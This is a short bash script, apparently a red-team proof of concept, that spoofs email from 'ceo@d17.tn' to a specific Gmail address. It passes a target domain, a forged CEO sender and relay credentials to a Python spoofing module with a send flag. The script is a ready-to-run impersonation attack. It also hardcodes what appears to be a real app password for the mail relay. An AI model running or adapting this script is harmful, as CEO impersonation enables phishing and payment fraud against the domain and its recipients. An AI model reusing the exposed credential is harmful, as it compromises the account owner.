#!/bin/bash
# Shadow Red Team - Email Spoofing PoC
# Edit RELAY_USER and RELAY_PASS before running

DOMAIN="d17.tn"
SPOOF_FROM="ceo@d17.tn"
SEND_TO="ambuguambuguambugu@gmail.com"
RELAY_USER="yourgmail@gmail.com"
RELAY_PASS="osvi pixf cshk oaeh"

python modules/email_spoof_tester.py \
  --domain "$DOMAIN" \
  --from "$SPOOF_FROM" \
  --to "$SEND_TO" \
  --relay-user "$RELAY_USER" \
  --relay-pass "$RELAY_PASS" \
  --send
